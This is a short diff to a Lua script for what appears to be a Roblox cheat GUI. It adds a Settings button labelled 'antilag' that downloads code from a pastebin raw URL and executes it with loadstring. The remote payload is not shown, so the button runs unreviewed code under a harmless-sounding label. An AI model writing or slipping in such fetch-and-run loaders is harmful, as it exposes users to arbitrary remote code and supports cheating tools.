@@ -45,7 +45,11 @@ local Tab = Window:NewTab("Settings")
 local Section = Tab:NewSection("Settings")
 Section:NewKeybind("Toggle UI", "Toggle's UI", Enum.KeyCode.RightShift, function()
 	Library:ToggleUI()
+end)
+Section:NewButton("antilag", "antilag", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/zaTGe6XX",true))()
     end)
+
 --Credits
 local Tab = Window:NewTab("Credits")
 local Section = Tab:NewSection("Credits")
